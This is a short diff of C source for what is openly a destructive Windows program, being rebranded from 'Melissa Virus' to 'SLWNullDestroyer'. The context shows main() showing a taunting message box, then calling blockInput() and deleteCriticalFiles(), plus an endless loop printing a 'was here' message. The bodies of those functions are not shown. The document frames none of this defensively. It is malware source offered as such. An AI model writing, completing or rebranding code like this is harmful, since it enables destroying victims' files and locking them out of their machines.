@@ -17,13 +17,13 @@ void deleteCriticalFiles() {
 void infiniteLoop() {
     // Sonsuz döngü
     while (1) {
-        printf("😀😂😈 Melissa was here!\n");
+        printf("😀😂😈 SLWNullDestroyer was here!\n");
         Sleep(500);
     }
 }
 
 int main() {
-    MessageBox(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "Melissa Virus", MB_OK);
+    MessageBox(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "SLWNullDestroyer", MB_OK);
 
     blockInput();
     deleteCriticalFiles();
